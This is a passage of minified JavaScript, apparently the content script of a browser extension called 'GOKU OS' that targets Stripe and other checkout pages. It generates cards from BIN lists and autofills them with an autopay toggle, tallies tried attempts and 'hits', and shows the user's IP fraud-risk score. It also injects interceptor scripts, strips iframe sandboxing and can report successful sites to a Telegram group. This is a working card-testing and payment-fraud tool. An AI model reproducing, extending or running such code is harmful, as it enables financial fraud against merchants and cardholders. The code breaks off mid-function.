const DEFAULT_SETTINGS = {
  binList: [],
  bin1: "",
  bin2: "",
  cardDetails: [],
  generateButtonId: "generateCardButton",
  extensionEnabled: !0,
  binMode: !0,
  userName: "",
  userEmail: "",
  userAddress: "",
  userCity: "",
  userZip: "",
  useCustomBilling: !1,
  customName: "",
  customEmail: "",
  customStreet: "",
  customCity: "",
  customPostalCode: "",
  customCountry: "",
  telegramName: "",
  hittedSites: [],
  sendSiteToGroup: !1,
};
let autopayInterval,
  state = {
    settings: { ...DEFAULT_SETTINGS },
    lastUsedCard: "",
    settingsLoaded: !1,
    extensionEnabled: !0,
    lastGeneratedCardDetails: null,
    cardIndex: 0,
    attemptCount: 0,
    successCount: 0,
    autopayEnabled: !1,
    currentSiteInfo: { name: "Unknown", url: "Unknown" },
  };
function injectScript(e) {
  const t = document.createElement("script");
  ((t.src = chrome.runtime.getURL(e)),
    (t.onload = () => t.remove()),
    (document.head || document.documentElement).appendChild(t));
}
function isMobile() {
  return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(
    navigator.userAgent,
  );
}
function hideSiteDetails() {
  if (document.getElementById("Goku-privacy-blur")) return;
  const e = document.createElement("style");
  ((e.id = "Goku-privacy-blur"),
    (e.textContent =
      "\n    /* Blur these specific Stripe/Replit elements */\n    .App-header,\n    .Link--primary,\n    .ProductSummary-name,\n    .ProductSummary-subscriptionDescription,\n    .LineItem-imageContainer,\n    .LineItem-productName,\n    .LineItem-description,\n    .YGErOEoF__Subtotal, \n    .OrderDetailsFooter-subtotalItems,\n    .FadeWrapper, \n    ._5UMtXkiA__OrderDetailsSubtotalItem,\n    .BjJO-0hk__BusinessLink-backLabel,\n    .ProductSummary-amountsDescriptions {\n        filter: blur(6px) !important;\n        opacity: 0.5;\n        pointer-events: none;\n        user-select: none;\n        transition: all 0.3s ease;\n    }\n\n    /* Keep Money Visible */\n    #OrderDetails-TotalAmount,\n    #ProductSummary-totalAmount,\n    .OrderDetails-total,\n    .CurrencyAmount {\n        filter: none !important;\n        opacity: 1 !important;\n        font-weight: 700 !important;\n    }\n  "),
    document.head.appendChild(e));
}
function showSiteDetails() {
  const e = document.getElementById("Goku-privacy-blur");
  e && e.remove();
}
document.addEventListener("DOMContentLoaded", () => {
  (injectScript("js/interceptor.js"), injectScript("js/stripe/injected.js"));
});
const bgColors = {
    "App-Overview": "#000000",
    "App-Payment": "#000000",
    "App-Background": "#000000",
    "Accordion ": "#000000",
  },
  textColors = {
    "App-Overview": "#ffffff",
    "Another-Class": "#ffcc00",
    "ProductSummary-name": "#ffffff",
    "App-Payment": "#ffffff",
    PaymentHeader: "#ffffff",
    "PaymentMethod-Heading": "#ffffff",
  };
function applyDarkMode() {
  if (!isMobile()) {
    (document.body.style.setProperty("--skeleton-bg-color", "#000000"),
      (document.body.style.backgroundColor = "#000000"),
      (document.body.style.color = "#ffffff"));
    for (const [e, t] of Object.entries(bgColors))
      document
        .querySelectorAll(`.${e}`)
        .forEach((e) => (e.style.backgroundColor = t));
    for (const [e, t] of Object.entries(textColors))
      document.querySelectorAll(`.${e}`).forEach((e) => (e.style.color = t));
    if (!document.getElementById("custom-pseudo-style")) {
      const e = document.createElement("style");
      ((e.id = "custom-pseudo-style"),
        (e.innerHTML =
          "\n .App-Container:not(.local-setup-mode)::before {\n background: #000000 !important;\n }\n\n .ButtonAndDividerContainer { display: none !important; opacity: 0 !important; }\n"),
        document.head.appendChild(e));
    }
  }
  (document
    .querySelectorAll(".ButtonAndDividerContainer")
    .forEach((e) => e.remove()),
    document.querySelectorAll("iframe").forEach((e) => {
      e.hasAttribute("sandbox") && e.removeAttribute("sandbox");
      const t = e.src || "",
        n = e.name || "";
      t.includes("stripe") ||
        n.startsWith("__privateStripe") ||
        t.includes("captcha") ||
        t.includes("challenge") ||
        t.includes("3ds") ||
        e.remove();
    }));
}
isMobile() ||
  (setTimeout(applyDarkMode, 100),
  new MutationObserver(applyDarkMode).observe(document.body, {
    attributes: !0,
    subtree: !0,
    attributeFilter: ["style", "class"],
    childList: !0,
  }));
const log = (e, t, n = null) => {},
  debounce = (e, t) => {
    let n;
    return function (...i) {
      (clearTimeout(n),
        (n = setTimeout(() => {
          (clearTimeout(n), e(...i));
        }, t)));
    };
  },
  isCheckoutOrPaymentPage = () =>
    [
      /^pay\./,
      /checkout\.stripe\.com/,
      /^buy\.stripe/,
      /checkout/i,
      /stripe/i,
      /taskade/i,
      /billing/i,
    ].some(
      (e) =>
        e.test(window.location.hostname) || e.test(window.location.pathname),
    );
function setupMobileKeyboardFix() {
  if (!isMobile()) return;
  const e = "mobile-keyboard-fix";
  if (!document.getElementById(e)) {
    const t = document.createElement("style");
    ((t.id = e),
      (t.textContent =
        "\n    /* Hide FAB and Stats Pill when keyboard is open */\n    body.keyboard-active #mobileFab,\n    body.keyboard-active #mobileStatsPill,\n    body.keyboard-active .flux-panel-container {\n        display: none !important;\n        opacity: 0 !important;\n        pointer-events: none !important;\n        transition: opacity 0.1s;\n    }\n    \n    /* BUT KEEP NOTIFICATIONS VISIBLE */\n    body.keyboard-active .flux-container {\n        display: flex !important;\n        opacity: 1 !important;\n        pointer-events: auto !important;\n        top: 10px !important; /* Force to top */\n    }\n"),
      document.head.appendChild(t));
  }
  if (window.visualViewport) {
    const e = window.visualViewport.height,
      t = () => {
        const t = window.visualViewport.height;
        e - t > 150
          ? document.body.classList.add("keyboard-open")
          : document.body.classList.remove("keyboard-open");
      };
    (window.visualViewport.addEventListener("resize", t),
      window.visualViewport.addEventListener("scroll", t));
  }
  (document.addEventListener("focusin", (e) => {
    (["INPUT", "TEXTAREA"].includes(e.target.tagName) ||
      e.target.isContentEditable) &&
      document.body.classList.add("keyboard-open");
  }),
    document.addEventListener("focusout", (e) => {
      setTimeout(() => {
        const e = document.activeElement;
        "INPUT" === e.tagName ||
          "TEXTAREA" === e.tagName ||
          e.isContentEditable ||
          document.body.classList.remove("keyboard-open");
      }, 200);
    }));
}
function showNotification(type, titleText, messageText = null, duration = 4000) {
  if (window.self !== window.top) return;

  let container = document.getElementById("Goku-notification-container");
  if (!container) {
    container = document.createElement("div");
    container.id = "Goku-notification-container";
    document.body.appendChild(container);

    const style = document.createElement("style");
    style.textContent = `
      #Goku-notification-container {
        position: fixed; top: 0; left: 0; right: 0; z-index: 2147483647;
        display: flex; flex-direction: column; align-items: center; gap: 8px;
        padding: 0; pointer-events: none;
      }

      #Goku-notification-container .goku-noti {
        position: relative; width: 100%; pointer-events: auto;
        transform-origin: top center;
        animation: gokuSlideIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        overflow: hidden;
      }

      #Goku-notification-container .goku-noti.hiding {
        animation: gokuSlideOut 0.35s cubic-bezier(0.4, 0, 1, 1) forwards;
      }

      @keyframes gokuSlideIn {
        from { opacity: 0; transform: translateY(-100%); }
        to { opacity: 1; transform: translateY(0); }
      }
      @keyframes gokuSlideOut {
        from { opacity: 1; transform: translateY(0); }
        to { opacity: 0; transform: translateY(-100%); }
      }

      /* === SUCCESS === */
      #Goku-notification-container .goku-noti.noti-success {
        background: linear-gradient(135deg, #064e3b 0%, #065f46 40%, #047857 100%);
        border-bottom: 1px solid rgba(52, 211, 153, 0.3);
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4), 0 0 40px rgba(16, 185, 129, 0.15);
      }

      /* === DECLINE / ERROR === */
      #Goku-notification-container .goku-noti.noti-decline {
        background: linear-gradient(135deg, #450a0a 0%, #7f1d1d 40%, #991b1b 100%);
        border-bottom: 1px solid rgba(239, 68, 68, 0.3);
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4), 0 0 40px rgba(239, 68, 68, 0.15);
      }

      /* === WARNING === */
      #Goku-notification-container .goku-noti.noti-warning {
        background: linear-gradient(135deg, #451a03 0%, #78350f 40%, #92400e 100%);
        border-bottom: 1px solid rgba(245, 158, 11, 0.3);
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4), 0 0 40px rgba(245, 158, 11, 0.15);
      }

      /* === INFO === */
      #Goku-notification-container .goku-noti.noti-info {
        background: linear-gradient(135deg, #1e1b4b 0%, #312e81 40%, #3730a3 100%);
        border-bottom: 1px solid rgba(99, 102, 241, 0.3);
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4), 0 0 40px rgba(99, 102, 241, 0.15);
      }

      /* Glow overlay */
      #Goku-notification-container .goku-noti-glow {
        position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; opacity: 0.6;
      }
      .noti-success .goku-noti-glow { background: radial-gradient(ellipse at 20% 20%, rgba(16, 185, 129, 0.25), transparent 60%); }
      .noti-decline .goku-noti-glow { background: radial-gradient(ellipse at 20% 20%, rgba(239, 68, 68, 0.25), transparent 60%); }
      .noti-warning .goku-noti-glow { background: radial-gradient(ellipse at 20% 20%, rgba(245, 158, 11, 0.25), transparent 60%); }
      .noti-info .goku-noti-glow { background: radial-gradient(ellipse at 20% 20%, rgba(99, 102, 241, 0.25), transparent 60%); }

      /* Content */
      #Goku-notification-container .goku-noti-content {
        position: relative; padding: 14px 20px 14px 20px; display: flex; flex-direction: column; gap: 4px;
      }

      /* Top row: icon + label */
      #Goku-notification-container .goku-noti-top {
        display: flex; align-items: center; gap: 8px;
        animation: gokuFadeRight 0.35s cubic-bezier(0.16, 1, 0.3, 1) 0.1s backwards;
      }
      @keyframes gokuFadeRight {
        from { opacity: 0; transform: translateX(-12px); }
        to { opacity: 1; transform: translateX(0); }
      }

      #Goku-notification-container .goku-noti-check {
        width: 22px; height: 22px; flex-shrink: 0;
        animation: gokuIconPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s backwards;
      }
      @keyframes gokuIconPop {
        from { transform: scale(0) rotate(-90deg); }
        to { transform: scale(1) rotate(0); }
      }

      #Goku-notification-container .goku-noti-label {
        font-size: 14px; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin: 0;
      }
      .noti-success .goku-noti-label { color: #d1fae5; }
      .noti-decline .goku-noti-label { color: #fecaca; }
      .noti-warning .goku-noti-label { color: #fef3c7; }
      .noti-info .goku-noti-label { color: #c7d2fe; }

      /* Title row */
      #Goku-notification-container .goku-noti-title {
        font-size: 15px; font-weight: 700; margin: 0; line-height: 1.3;
        animation: gokuFadeRight 0.35s cubic-bezier(0.16, 1, 0.3, 1) 0.2s backwards;
      }
      .noti-success .goku-noti-title { color: #a7f3d0; }
      .noti-decline .goku-noti-title { color: #fca5a5; }
      .noti-warning .goku-noti-title { color: #fde68a; }
      .noti-info .goku-noti-title { color: #a5b4fc; }

      /* Message row with card icon */
      #Goku-notification-container .goku-noti-msg {
        display: flex; align-items: center; gap: 6px; margin-top: 2px;
        animation: gokuFadeRight 0.35s cubic-bezier(0.16, 1, 0.3, 1) 0.3s backwards;
      }
      #Goku-notification-container .goku-noti-msg-icon {
        width: 14px; height: 14px; flex-shrink: 0; opacity: 0.7;
      }
      .noti-success .goku-noti-msg-icon { color: #6ee7b7; }
      .noti-decline .goku-noti-msg-icon { color: #fca5a5; }
      .noti-warning .goku-noti-msg-icon { color: #fcd34d; }
      .noti-info .goku-noti-msg-icon { color: #93c5fd; }

      #Goku-notification-container .goku-noti-msg-text {
        font-size: 13px; font-weight: 500; margin: 0; opacity: 0.85;
      }
      .noti-success .goku-noti-msg-text { color: #6ee7b7; }
      .noti-decline .goku-noti-msg-text { color: #fca5a5; }
      .noti-warning .goku-noti-msg-text { color: #fcd34d; }
      .noti-info .goku-noti-msg-text { color: #93c5fd; }

      /* Close button */
      #Goku-notification-container .goku-noti-close {
        position: absolute; top: 10px; right: 12px; padding: 4px; border: none; background: transparent;
        cursor: pointer; transition: all 0.2s; border-radius: 50%; display: flex; align-items: center; justify-content: center;
      }
      .noti-success .goku-noti-close { color: rgba(167, 243, 208, 0.5); }
      .noti-decline .goku-noti-close { color: rgba(252, 165, 165, 0.5); }
      .noti-warning .goku-noti-close { color: rgba(253, 224, 71, 0.5); }
      .noti-info .goku-noti-close { color: rgba(165, 180, 252, 0.5); }
      #Goku-notification-container .goku-noti-close:hover { background: rgba(255,255,255,0.1); color: white; transform: rotate(90deg); }
      #Goku-notification-container .goku-noti-close svg { width: 16px; height: 16px; }

      /* Progress bar */
      #Goku-notification-container .goku-noti-progress {
        position: absolute; bottom: 0; left: 0; height: 2px;
        transform-origin: left; animation: gokuShrink linear forwards;
      }
      .noti-success .goku-noti-progress { background: linear-gradient(90deg, #10b981, rgba(16, 185, 129, 0)); }
      .noti-decline .goku-noti-progress { background: linear-gradient(90deg, #ef4444, rgba(239, 68, 68, 0)); }
      .noti-warning .goku-noti-progress { background: linear-gradient(90deg, #f59e0b, rgba(245, 158, 11, 0)); }
      .noti-info .goku-noti-progress { background: linear-gradient(90deg, #6366f1, rgba(99, 102, 241, 0)); }
      @keyframes gokuShrink { from { width: 100%; } to { width: 0%; } }
    `;
    document.head.appendChild(style);
  }

  const map = {
    success: {
      variant: 'noti-success',
      label: 'SUCCESS',
      checkIcon: '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />',
      checkColor: '#34d399'
    },
    error: {
      variant: 'noti-decline',
      label: 'DECLINED',
      checkIcon: '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />',
      checkColor: '#f87171'
    },
    warning: {
      variant: 'noti-warning',
      label: 'WARNING',
      checkIcon: '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />',
      checkColor: '#fbbf24'
    },
    info: {
      variant: 'noti-info',
      label: 'INFO',
      checkIcon: '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />',
      checkColor: '#818cf8'
    }
  };

  let data = map[type];
  if (!data) {
    if (type === 'card_declined') data = map.error;
    else data = map.info;
  }

  const noti = document.createElement("div");
  noti.className = `goku-noti ${data.variant}`;

  const durSec = duration > 0 ? (duration / 1000) + "s" : "0s";
  const progressHtml = duration > 0 ? `<div class="goku-noti-progress" style="animation-duration: ${durSec}"></div>` : '';

  const msgIcon = '<svg class="goku-noti-msg-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><rect x="1" y="4" width="22" height="16" rx="2" ry="2" stroke-width="2"/><line x1="1" y1="10" x2="23" y2="10" stroke-width="2"/></svg>';
  const messageHtml = messageText ? `<div class="goku-noti-msg">${msgIcon}<p class="goku-noti-msg-text">${messageText}</p></div>` : '';

  noti.innerHTML = `
    <div class="goku-noti-glow"></div>
    ${progressHtml}
    <div class="goku-noti-content">
      <div class="goku-noti-top">
        <svg class="goku-noti-check" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="${data.checkColor}">${data.checkIcon}</svg>
        <h4 class="goku-noti-label">${data.label}</h4>
      </div>
      <h3 class="goku-noti-title">${titleText}</h3>
      ${messageHtml}
      <button class="goku-noti-close">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
        </svg>
      </button>
    </div>
  `;

  container.appendChild(noti);

  const dismiss = () => {
    noti.classList.add("hiding");
    setTimeout(() => {
      noti.remove();
      if (container.children.length === 0) container.remove();
    }, 350);
  };

  noti.querySelector(".goku-noti-close").addEventListener("click", dismiss);
  if (duration > 0) setTimeout(dismiss, duration);
}
function updateIpRiskUI(e) {
  const t = document.getElementById("Goku-ip-display"),
    n = document.getElementById("Goku-risk-display");
  (t && (t.textContent = e.ip || "Unknown"),
    n &&
      ((n.textContent = `${e.riskLabel} (${e.riskScore}%)`),
      (n.className = "risk-val " + (e.riskClass || "risk-low")),
      "risk-high" === e.riskClass
        ? (n.style.color = "#ef4444")
        : "risk-medium" === e.riskClass
          ? (n.style.color = "#f59e0b")
          : (n.style.color = "#22c55e")));
}
function addGenerateButton() {
  if (document.querySelector(".Goku-panel-container")) return;
  const e = document.createElement("style");
  ((e.textContent =
    "\n    /* === VARIABLES === */\n    :root {\n      --gen-bg: #09090b;\n      --gen-surface: #18181b;\n      --gen-surface-hover: #27272a;\n      --gen-border: #27272a;\n      --gen-text: #fafafa;\n      --gen-text-muted: #a1a1aa;\n      --gen-primary: 59, 130, 246;\n      --gen-accent: 34, 197, 94;\n      --gen-shadow: rgba(0,0,0,0.5);\n      --flux-font: 'Segoe UI', sans-serif;\n    }\n\n    /* === DESKTOP: Goku PANEL === */\n    .Goku-panel-container {\n      position: fixed; top: 20px; left: 20px; z-index: 2147483647;\n      width: 240px;\n      background: var(--gen-bg);\n      border: 1px solid var(--gen-border);\n      border-radius: 16px;\n      font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif;\n      box-shadow: 0 10px 30px -5px var(--gen-shadow), 0 8px 10px -6px var(--gen-shadow);\n      display: flex; flex-direction: column;\n      overflow: hidden;\n      transition: height 0.3s ease, background 0.3s ease;\n      animation: slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;\n    }\n    @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }\n\n    .Goku-header {\n      display: flex; align-items: center; justify-content: space-between;\n      padding: 12px 14px; background: var(--gen-surface);\n      border-bottom: 1px solid var(--gen-border);\n      cursor: move; user-select: none;\n    }\n    .header-branding { display: flex; align-items: center; gap: 8px; }\n    .header-title { font-size: 13px; font-weight: 700; color: var(--gen-text); letter-spacing: 0.5px; }\n    .header-controls { display: flex; gap: 6px; }\n    .ctrl-btn {\n      background: transparent; border: none; cursor: pointer; color: var(--gen-text-muted);\n      padding: 4px; border-radius: 6px; display: flex; align-items: center; justify-content: center;\n      transition: all 0.2s;\n    }\n    .ctrl-btn:hover { background: rgba(128,128,128,0.1); color: var(--gen-text); }\n\n    .Goku-content { padding: 14px; display: flex; flex-direction: column; gap: 12px; }\n    .Goku-panel-container.minimized .Goku-content { display: none; }\n    .Goku-panel-container.minimized { width: auto; min-width: 200px; }\n    .minimized-info { display: none; font-size: 11px; color: var(--gen-text-muted); margin-left: 10px; }\n    .Goku-panel-container.minimized .minimized-info { display: block; }\n\n    .Goku-user-row { display: flex; gap: 10px; align-items: center; }\n    .Goku-avatar { width: 36px; height: 36px; border-radius: 50%; border: 2px solid var(--gen-surface); }\n    .Goku-user-info { display: flex; flex-direction: column; }\n    .Goku-username { font-size: 13px; font-weight: 600; color: var(--gen-text); }\n    .Goku-status { font-size: 10px; color: rgb(var(--gen-primary)); font-weight: 500; }\n\n    /* IP & RISK BOX (UPDATED WITH BLUR) */\n    .Goku-ip-box {\n        background: var(--gen-surface); border: 1px solid var(--gen-border);\n        border-radius: 8px; padding: 8px; display: flex; flex-direction: column; gap: 4px;\n    }\n    .ip-row { display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--gen-text-muted); }\n    \n    .ip-val { \n        font-family: monospace; color: var(--gen-text); font-weight: 700; \n        filter: blur(5px); cursor: pointer; transition: all 0.3s ease; user-select: none; \n    }\n    .ip-val:hover { filter: blur(3px); } /* Slight reveal on hover */\n    .ip-val.revealed { filter: blur(0); } /* Fully visible when toggled */\n    \n    .risk-val { font-weight: 700; }\n\n    .Goku-stats-bar {\n      display: flex; background: var(--gen-surface); border: 1px solid var(--gen-border);\n      border-radius: 10px; padding: 4px; gap: 2px;\n    }\n    .stat-segment {\n      flex: 1; display: flex; flex-direction: column; align-items: center;\n      padding: 6px; position: relative;\n    }\n    .stat-segment:first-child::after {\n        content: ''; position: absolute; right: 0; top: 20%; height: 60%; width: 1px; background: var(--gen-border);\n    }\n    .stat-value { font-family: monospace; font-size: 18px; font-weight: 700; line-height: 1.1; }\n    .stat-label { font-size: 9px; text-transform: uppercase; color: var(--gen-text-muted); font-weight: 700; }\n    .stat-value.tried { color: var(--gen-text); }\n    .stat-value.hits { color: rgb(var(--gen-accent)); text-shadow: 0 0 12px rgba(var(--gen-accent), 0.35); }\n\n    #generateButton {\n      background: rgb(var(--gen-primary)); color: #fff; border: none; padding: 12px;\n      border-radius: 10px; font-weight: 700; font-size: 12px; cursor: pointer;\n      display: flex; justify-content: center; align-items: center; gap: 8px;\n      box-shadow: 0 4px 15px rgba(var(--gen-primary), 0.25);\n      transition: all 0.2s;\n    }\n    #generateButton:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(var(--gen-primary), 0.35); }\n    #generateButton:active { transform: scale(0.97); }\n\n    .Goku-option-row { display: flex; align-items: center; justify-content: space-between; padding: 2px 0; }\n    .Goku-option-label { font-size: 11px; color: var(--gen-text-muted); font-weight: 600; }\n\n    .Goku-toggle { position: relative; width: 32px; height: 18px; }\n    .Goku-toggle input { opacity: 0; width: 0; height: 0; }\n    .toggle-track { \n      position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; \n      background: var(--gen-surface); border: 1px solid var(--gen-border); border-radius: 99px; transition: .3s; \n    }\n    .toggle-track:before { \n      position: absolute; content: \"\"; height: 12px; width: 12px; left: 2px; bottom: 2px; \n      background: var(--gen-text-muted); transition: .3s; border-radius: 50%; \n    }\n    input:checked + .toggle-track { background: rgba(var(--gen-primary), 0.15); border-color: rgb(var(--gen-primary)); }\n    input:checked + .toggle-track:before { transform: translateX(14px); background: rgb(var(--gen-primary)); }\n\n    /* === MOBILE: FLUX UI === */\n    #mobileStatsPill, #mobileFab, #mobileMenu { display: none; }\n\n    @media screen and (max-width: 600px) {\n      .Goku-panel-container { display: none !important; }\n\n      #mobileStatsPill {\n        display: flex !important; position: fixed; bottom: 20px; left: 20px; z-index: 2147483647;\n        background: rgba(20,20,20,0.9); backdrop-filter: blur(20px);\n        border: 1px solid rgba(255,255,255,0.1); border-radius: 18px;\n        padding: 10px 14px; align-items: center; gap: 10px;\n        box-shadow: 0 8px 32px rgba(0,0,0,0.3); font-family: var(--flux-font);\n      }\n      .pill-avatar { width: 34px; height: 34px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.2); }\n      .pill-content { display: flex; flex-direction: column; gap: 2px; }\n      .pill-user { font-size: 11px; font-weight: 700; color: #fff; }\n      .pill-stats-row { display: flex; gap: 8px; font-size: 9px; font-weight: 700; }\n      .pill-stat { color: #aaa; }\n      .pill-stat b { color: #fff; margin-left: 2px; }\n      .pill-stat.success b { color: #4ade80; }\n      .pill-sep { width: 1px; height: 8px; background: rgba(255,255,255,0.2); }\n\n      #mobileFab {\n        display: flex !important; position: fixed; bottom: 20px; right: 20px; z-index: 2147483647;\n        width: 52px; height: 52px; border-radius: 50%;\n        background: #3b82f6; color: #fff;\n        align-items: center; justify-content: center;\n        box-shadow: 0 8px 24px rgba(59, 130, 246, 0.4);\n        cursor: pointer; transition: all 0.3s;\n      }\n      #mobileFab.open { transform: rotate(45deg); background: #fff; color: #000; }\n\n      #mobileMenu {\n        display: flex !important; flex-direction: column;\n        position: fixed; bottom: 80px; right: 20px; z-index: 2147483646;\n        background: #18181b; border: 1px solid #27272a; border-radius: 18px;\n        padding: 14px; gap: 12px; width: 168px;\n        opacity: 0; transform: translateY(20px) scale(0.95); pointer-events: none;\n        transition: all 0.25s ease;\n      }\n      #mobileMenu.visible { opacity: 1; transform: translateY(0) scale(1); pointer-events: all; }\n\n      .mobile-btn {\n        background: rgba(59, 130, 246, 0.2); color: #60a5fa;\n        border: 1px solid rgba(59, 130, 246, 0.4); padding: 12px; border-radius: 12px;\n        font-weight: 700; font-size: 11px; font-family: var(--flux-font); cursor: pointer; width: 100%;\n      }\n      .mobile-row { display: flex; justify-content: space-between; align-items: center; padding: 0 4px; }\n      .mobile-label { font-size: 11px; color: #a1a1aa; font-weight: 700; }\n    }\n  "),
    document.head.appendChild(e));
  const t = document.createElement("div");
  ((t.className = "Goku-panel-container"),
    (t.innerHTML =
      '\n    <div class="Goku-header" id="GokuDragHandle">\n      <div class="header-branding">\n        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:rgb(var(--gen-primary))"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>\n        <span class="header-title">GOKU OS</span>\n        <span class="minimized-info" id="minimizedUsername"></span>\n      </div>\n      <div class="header-controls">\n        <button class="ctrl-btn" id="minimizeBtn" title="Minimize">\n          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"></line></svg>\n        </button>\n      </div>\n    </div>\n\n    <div class="Goku-content">\n      <div class="Goku-user-row">\n        <img src="" id="fluxAvatar" class="Goku-avatar">\n        <div class="Goku-user-info">\n            <span id="fluxUsername" class="Goku-username">Fetching...</span>\n            <span class="Goku-status" id="fluxUserStatus">Checking Access...</span>\n        </div>\n      </div>\n\n      <div class="Goku-ip-box">\n        <div class="ip-row"><span>IP</span> <span id="Goku-ip-display" class="ip-val" title="Click to reveal">...</span></div>\n        <div class="ip-row"><span>RISK</span> <span id="Goku-risk-display" class="risk-val">—</span></div>\n      </div>\n      \n      <div class="Goku-stats-bar">\n        <div class="stat-segment">\n            <span class="stat-value tried" id="Goku-attempts-counter">0</span>\n            <span class="stat-label">Tried</span>\n        </div>\n        <div class="stat-segment">\n            <span class="stat-value hits" id="Goku-success-counter">0</span>\n            <span class="stat-label">Hits</span>\n        </div>\n      </div>\n      \n      <button id="generateButton">\n        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>\n        GENERATE\n      </button>\n      \n      <div class="Goku-option-row">\n        <span class="Goku-option-label">AUTOPAY</span>\n        <label class="Goku-toggle"><input type="checkbox" id="autopayToggle"><span class="toggle-track"></span></label>\n      </div>\n\n      <div class="Goku-option-row">\n        <span class="Goku-option-label">PRIVACY MODE</span>\n        <label class="Goku-toggle"><input type="checkbox" id="privacyToggle"><span class="toggle-track"></span></label>\n      </div>\n    </div>\n  '));
  const n = document.createElement("div");
  ((n.id = "mobileStatsPill"),
    (n.innerHTML =
      '\n    <img src="" id="mobileAvatar" class="pill-avatar">\n    <div class="pill-content">\n        <span id="mobileUsername" class="pill-user">Guest</span>\n        <div class="pill-stats-row">\n            <span class="pill-stat">TRY <b id="mobileTriedCount">0</b></span>\n            <div class="pill-sep"></div>\n            <span class="pill-stat success">HIT <b id="mobileHitsCount">0</b></span>\n        </div>\n    </div>'));
  const i = document.createElement("div");
  ((i.id = "mobileFab"),
    (i.innerHTML =
      '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line></svg>'));
  const a = document.createElement("div");
  ((a.id = "mobileMenu"),
    (a.innerHTML =
      '\n    <button class="mobile-btn" id="mobileGenerateBtn">GENERATE CARD</button>\n    <div class="mobile-row">\n        <span class="mobile-label">AUTOPAY</span>\n        <label class="Goku-toggle"><input type="checkbox" id="mobileAutopayToggle"><span class="toggle-track"></span></label>\n    </div>\n    <div class="mobile-row">\n        <span class="mobile-label">PRIVACY</span>\n        <label class="Goku-toggle"><input type="checkbox" id="mobilePrivacyToggle"><span class="toggle-track"></span></label>\n    </div>'),
    document.body.appendChild(t),
    document.body.appendChild(n),
    document.body.appendChild(i),
    document.body.appendChild(a));
  const o = document.getElementById("GokuDragHandle");
  let r,
    s,
    l,
    d,
    c = !1;
  (o.addEventListener("mousedown", (e) => {
    if (e.target.closest("button")) return;
    ((c = !0), (r = e.clientX), (s = e.clientY));
    const n = t.getBoundingClientRect();
    ((l = n.left),
      (d = n.top),
      (t.style.transition = "none"),
      e.preventDefault());
  }),
    document.addEventListener("mousemove", (e) => {
      c &&
        ((t.style.left = `${l + (e.clientX - r)}px`),
        (t.style.top = `${d + (e.clientY - s)}px`));
    }),
    document.addEventListener("mouseup", () => {
      ((c = !1), (t.style.transition = ""));
    }),
    document.getElementById("minimizeBtn").addEventListener("click", () => {
      t.classList.toggle("minimized");
    }));
  const p = document.getElementById("Goku-ip-display");
  (p &&
    p.addEventListener("click", () => {
      p.classList.toggle("revealed");
    }),
    i.addEventListener("click", (e) => {
      (e.stopPropagation(),
        i.classList.toggle("open"),
        a.classList.toggle("visible"));
    }),
    document.addEventListener("click", (e) => {
      a.contains(e.target) ||
        i.contains(e.target) ||
        (a.classList.remove("visible"), i.classList.remove("open"));
    }),
    (window.updateCountersUI = () => {
      const e = (void 0 !== state && state.attemptCount) || 0,
        t = (void 0 !== state && state.successCount) || 0;
      ((document.getElementById("Goku-attempts-counter").textContent = e),
        (document.getElementById("Goku-success-counter").textContent = t));
      const n = document.getElementById("mobileTriedCount"),
        i = document.getElementById("mobileHitsCount");
      (n && (n.textContent = e), i && (i.textContent = t));
    }),
    chrome.storage.sync.get(
      ["telegramName", "telegramPhotoUrl", "isVerified"],
      (e) => {
        const t = e.telegramName || "Guest User",
          n =
            e.telegramPhotoUrl ||
            `https://ui-avatars.com/api/?name=${encodeURIComponent(t)}&background=3B82F6&color=fff&bold=true`;
